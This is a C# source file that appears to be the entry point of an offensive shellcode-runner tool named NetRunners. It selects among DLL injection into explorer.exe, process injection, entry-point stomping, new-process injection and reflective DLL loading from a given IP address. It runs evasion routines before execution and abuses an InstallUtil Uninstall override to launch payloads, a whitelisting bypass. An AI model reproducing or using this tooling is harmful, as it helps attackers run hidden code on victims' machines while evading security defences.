using System;
using NetRunners.Interfaces;
using NetRunners.Runners;

namespace NetRunners.Exe
{
    class Program
    {
        /// <summary>
        /// Entry point for this program, calls Evasion functions, and then determines which runner to call.
        /// Accepts one or no arguments at runtime. By default (no args specified), calls default Shellcode Runner.
        /// </summary>
        /// <param name="-cdi">
        /// Calls Classic Dll injection Runner. 
        /// Targets explorer.exe process, injects an external C++ dll into it.
        /// </param>
        /// <param name="-cpi">
        /// Calls ClassicProcessInjectionRunner.
        /// Targets explorer.exe process, injects payload into it.
        /// Supports (x64) to (x64), (x64) to (x86), (x86) to (x86)
        /// </param>
        /// <param name="-epi">
        /// Calls EntryPointStompingProcessInjectionRunner. 
        /// Creates new suspended process, injects payload into its entry point, resumes process.
        /// </param>
        /// <param name="-pi">
        /// Calls Process Injection Runner.
        /// Targets explorer.exe process, injects payload into it.
        /// Supports (x64) to (x64), (x64) to (x86), (x86) to (x86)
        /// </param>
        /// <param name="-npi">
        /// Calls NewProcessInjectionRunner. 
        /// Creates a new process, injects payload into it. Accepts one argument for target process (Eg: powershell.exe)
        /// NR.exe -npi powershell.exe
        /// </param>
        static void Main(string[] args)
        {
            NetRunners.Helpers.Helper.PrintBanner();

            // execute runner
            IRunner runner = DetermineRunner(args);
            // evasion
            NetRunners.Helpers.Helper.PerformEvasion();
            runner?.Run(args);
        }
        // Determine the function call based on the argument provided, case insensitive
        static IRunner DetermineRunner(string[] args)
        {
            string call = (args.Length >= 1) 
                ? args[0].ToLower() 
                : string.Empty;
            switch (call)
            {
                case "-cdi":
                    return new ClassicDllInjectionRunner();
                case "-cpi":
                    return new ClassicProcessInjectionRunner();
                case "-epi":
                    if (IntPtr.Size == 4)
                    {
                        Console.WriteLine("[-] Error: This technique is x64 Only.");        // to-do make it x86 compatible.
                        Environment.Exit(1);
                    }
                    return new EntryPointStompingProcessInjectionRunner();
                case "-npi":
                    return new NewProcessInjectionRunner();
                case "-pi":
                    return new ProcessInjectionRunner();
                case "-rdl":
                    if (args.Length != 2)
                    {
                        Console.WriteLine("[-] -rdl expects an IP.");
                        System.Environment.Exit(1);
                    }
                    return new ReflectiveDllLoad();
                default:
                    return new DefaultRunner();
            }
        }
    }
    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // evasion
            NetRunners.Helpers.Helper.PerformEvasion();
            // execution
            NetRunners.Helpers.Helper.SelectAndExecuteRunner();
        }
    }
}
